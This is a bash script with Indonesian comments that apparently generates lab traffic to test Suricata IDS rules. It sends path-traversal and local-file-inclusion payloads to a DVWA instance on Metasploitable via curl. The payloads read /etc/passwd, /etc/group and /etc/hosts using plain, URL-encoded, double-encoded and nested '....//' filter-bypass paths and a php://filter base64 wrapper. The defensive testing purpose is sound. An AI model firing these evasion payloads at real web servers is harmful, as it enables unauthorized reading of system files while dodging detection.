#!/bin/bash

# =================================================================
# MODUL 06: PATH TRAVERSAL (FILE INCLUSION) - ROTASI PAYLOAD
# Strategi: 3 Level Depth (Basic, Encoding, Wrapper/Filter)
# Input: Menerima argumen $1 sebagai Nomor Ronde
# =================================================================

# Menerima Input Nomor Ronde dari Daily Round
ROUND=${1:-1} # Default ke ronde 1 jika kosong

# KONFIGURASI
TARGET_IP="192.168.113.50"   # Ganti dengan IP Metasploitable
# Masukkan PHPSESSID valid dari browser
COOKIE="security=low; PHPSESSID=ganti_dengan_session_id_anda"
LOG_FILE="logs/trav_session_$(date +%F).log"

# URL Vulnerable di DVWA
BASE_URL="http://$TARGET_IP/dvwa/vulnerabilities/fi/?page="

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# =================================================================
# LOGIKA ROTASI PAYLOAD (PAYLOAD DIVERSITY)
# Mengubah Teknik Evasion (Level 2) & Target File (Level 3)
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Ronde 1-10) ---
    # Level 2: Standard URL Encode
    # ../ -> ..%2f
    PAYLOAD_L2="..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
    DESC_L2="Evasion: URL Encoding (Standard)"

    # Level 3: Wrapper Target Passwd
    FILE_L3="etc/passwd"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Ronde 11-20) ---
    # Level 2: Double URL Encode
    # % -> %25, jadi %2f -> %252f
    PAYLOAD_L2="%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
    DESC_L2="Evasion: Double URL Encoding"

    # Level 3: Wrapper Target Group (Variasi file)
    FILE_L3="etc/group"

else
    # --- SET C (Ronde 21-30) ---
    # Level 2: Nested Traversal
    # ....// -> Jadi ../ setelah difilter satu kali
    PAYLOAD_L2="....//....//....//....//....//etc/passwd"
    DESC_L2="Evasion: Nested Traversal (Filter Bypass)"

    # Level 3: Wrapper Target Hosts (Variasi file)
    FILE_L3="etc/hosts"
fi

echo "[+] [06_TRAV] Memulai Modul Path Traversal..."
echo "[+] Target Base URL: $BASE_URL"
echo "[+] Mode: Ronde $ROUND ($DESC_L2)"

# Cek Cookie
if [[ "$COOKIE" == *"ganti_dengan"* ]]; then
   echo -e "${RED}[!] WARNING: Cookie belum di-set! Script akan gagal login DVWA.${NC}"
   sleep 3
fi

# -----------------------------------------------------------------
# LEVEL 1: BASIC TRAVERSAL (NOISY - BASELINE)
# Tujuan: Baseline. Menguji rule standar "../" (Dot Dot Slash).
# Payload: ../../../../../etc/passwd (Tetap Sama)
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Basic Traversal (/etc/passwd)...${NC}"

PAYLOAD="../../../../../etc/passwd"
FULL_URL="${BASE_URL}${PAYLOAD}"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Payload Path]   : $PAYLOAD${NC}"
echo -e "${YELLOW}    [Full URL]       : $FULL_URL${NC}"
echo -e "${YELLOW}    [Info Teknik]    : Mengakses file sensitif menggunakan path relative${NC}"

# Eksekusi
curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl1_r${ROUND}.txt
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER /etc/passwd Access)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 2: ENCODED TRAVERSAL (EVASION - DINAMIS)
# Tujuan: Menguji kemampuan decoding URI Suricata.
# Teknik: Menggunakan variabel payload dinamis ($PAYLOAD_L2).
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running $DESC_L2...${NC}"

# Menggunakan variabel PAYLOAD_L2 yang berubah sesuai ronde
FULL_URL="${BASE_URL}${PAYLOAD_L2}"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Payload Encoded]: $PAYLOAD_L2${NC}"
echo -e "${YELLOW}    [Info Teknik]    : Menguji kemampuan decoding IDS${NC}"

# Eksekusi
curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl2_r${ROUND}.txt
echo "    -> Selesai. (Harapan: Deteksi Evasion atau tetap terdeteksi sebagai LFI)"
sleep 5

# -----------------------------------------------------------------
# LEVEL 3: PHP WRAPPER (LFI to RCE PREPARATION - DINAMIS)
# Tujuan: Menguji deteksi protokol PHP (php://filter).
# Teknik: Menggunakan 'php://filter' dengan target file bervariasi ($FILE_L3).
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running PHP Filter Wrapper (Target: $FILE_L3)...${NC}"

# Payload PHP Wrapper, target file berubah sesuai ronde
PAYLOAD="php://filter/convert.base64-encode/resource=../../../../../$FILE_L3"
FULL_URL="${BASE_URL}${PAYLOAD}"

# TAMPILKAN LAPORAN
echo -e "${YELLOW}    [Payload Wrapper]: $PAYLOAD${NC}"
echo -e "${YELLOW}    [Info Teknik]    : Menggunakan protokol php:// untuk membungkus file target${NC}"

# Eksekusi
curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl3_r${ROUND}.txt
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER PHP wrapper)"

echo "[+] [06_TRAV] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"